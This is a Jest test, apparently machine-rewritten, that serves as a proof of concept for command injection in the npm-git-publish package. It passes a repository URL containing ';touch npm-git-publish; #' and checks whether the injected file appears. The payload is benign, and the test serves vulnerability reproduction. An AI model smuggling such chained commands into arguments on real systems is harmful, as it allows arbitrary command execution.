const v35 = () => {
    const v19 = expect.assertions(2);
    v19;
    const git = require('npm-git-publish');
    const fs = require('fs');
    const path = './npm-git-publish';
    try {
        const v20 = fs.existsSync(path);
        if (v20) {
            const v21 = fs.unlinkSync(path);
            v21;
            const v22 = console.log('File removed:', path);
            v22;
        }
    } catch (err) {
        const v23 = console.error(err);
        v23;
    }
    file_exist = fs.existsSync(path);
    const v24 = expect(file_exist);
    const v25 = v24.toBe(false);
    v25;
    const v26 = git.publish('.', 'http://gihub.com ;touch npm-git-publish; #');
    const v33 = () => {
        file_exist = fs.existsSync(path);
        const v27 = expect(file_exist);
        const v28 = v27.toBe(true);
        v28;
        const v29 = {
            recursive: true,
            force: true
        };
        const v30 = fs.rmSync('./gihub.com', v29);
        v30;
        const v31 = function (err) {
        };
        const v32 = fs.unlink(path, v31);
        v32;
    };
    const v34 = v26.catch(v33);
    return v34;
};
const v36 = test('Command Injection in npm-git-publish', v35);
v36;